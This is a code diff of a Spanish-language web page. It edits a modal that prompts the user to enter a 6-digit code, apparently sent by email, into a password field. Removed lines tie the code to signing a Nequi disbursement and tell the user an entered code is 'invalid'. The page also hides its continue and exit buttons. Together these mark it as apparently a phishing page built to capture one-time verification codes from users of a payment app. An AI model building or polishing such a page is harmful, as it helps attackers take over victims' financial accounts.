@@ -11,7 +11,7 @@
 body{
     margin:0;
     font-family:'Inter',sans-serif;
-    background:#f4f4f400;
+    background:#f4f4f4;
 }
 
 /* HEADER */
@@ -148,6 +148,12 @@ body{
     font-size:15px;
 }
 
+/* 🔥 IMAGEN ICONO */
+.icono-img{
+    width:60px;
+    margin-bottom:10px;
+}
+
 /* 🔥 OCULTAR BOTONES */
 #btnContinuar,
 .salir{
@@ -164,10 +170,13 @@ body{
 <!-- 🔥 MODAL -->
 <div id="modalAviso" class="modal">
   <div class="modal-content">
-    <div style="font-size:40px;">⏰</div>
+
+    <!-- 🔥 IMAGEN EN VEZ DE EMOJI -->
+    <img src="https://cdn-icons-png.flaticon.com/512/992/992700.png" class="icono-img">
+
     <h2>¡Ya casi!</h2>
     <p>
-      El código es invalido se puede demorar un poco para llegar.<br>
+      El código se puede demorar un poco para llegar.<br>
       Escríbelo porfa cuando te llegue
     </p>
 
@@ -183,8 +192,8 @@ body{
     <div class="code-boxes" id="boxes"></div>
 
     <div class="text">
-        Escribe los 6 números que enviamos a tu correo electrónico <br>  o mensaje de texto a tu numero celular para Firmar el desembolso Nequi:<br>
-        
+        Escribe los 6 números que enviamos a tu correo electrónico:<br>
+        <span class="email">nic****@gmail.com</span>
     </div>
 
     <input type="password" id="claveInput" maxlength="6" inputmode="numeric">
